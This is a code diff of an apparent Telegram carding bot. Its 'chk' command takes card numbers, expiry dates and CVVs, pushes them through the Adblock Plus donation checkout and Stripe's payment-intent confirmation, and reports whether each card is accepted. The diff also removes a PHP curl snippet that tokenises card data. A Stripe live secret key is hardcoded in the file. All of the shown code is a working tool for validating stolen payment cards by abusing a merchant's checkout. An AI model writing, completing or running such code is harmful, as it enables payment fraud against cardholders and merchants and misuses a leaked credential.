@@ -114,15 +114,6 @@ def bin(update, context):
         Sendmessage(chat_id, text)
 ################################################################################################################################
 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=".$cc."&card[exp_month]=".$mm."&card[exp_year]=".$yyyy."&card[cvc]=".$cvv."");
-curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
-$headers = array();
-$headers[] = 'Content-Type: application/x-www-form-urlencoded';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-$result = curl_exec($ch);
 def chk(update,context):
     chat_id = update.message.chat_id
     info = update.effective_user
@@ -137,7 +128,7 @@ def chk(update,context):
     cvv=i[3]
     skeys = OrderedDict([(1,'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')]);
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0","Accept": "application/json, text/plain, */*","Content-Type": "application/x-www-form-urlencoded"}
-    s = session.post("https://m.stripe.com/6",headers=headers)
+    s = requests.post("https://m.stripe.com/6",headers=headers)
     r = s.json()
     Guid = r["guid"]
     Muid = r["muid"]
@@ -161,7 +152,7 @@ def chk(update,context):
       "Accept-Language": "en-US,en;q=0.9"
     }
     
-    re = session.post("https://new-integration.adblockplus.org/",
+    re = requests.post("https://new-integration.adblockplus.org/",
                      data=payload, headers=head)
     client = re.text
     pi = client[0:27]
@@ -197,7 +188,7 @@ def chk(update,context):
       "Accept-Language": "en-US,en;q=0.9"
     }
     
-    rx = session.post(f"https://api.stripe.com/v1/payment_intents/{pi}/confirm",
+    rx = requests.post(f"https://api.stripe.com/v1/payment_intents/{pi}/confirm",
                      data=load, headers=header)
     res = rx.json()
     msg = res["error"]["message"]
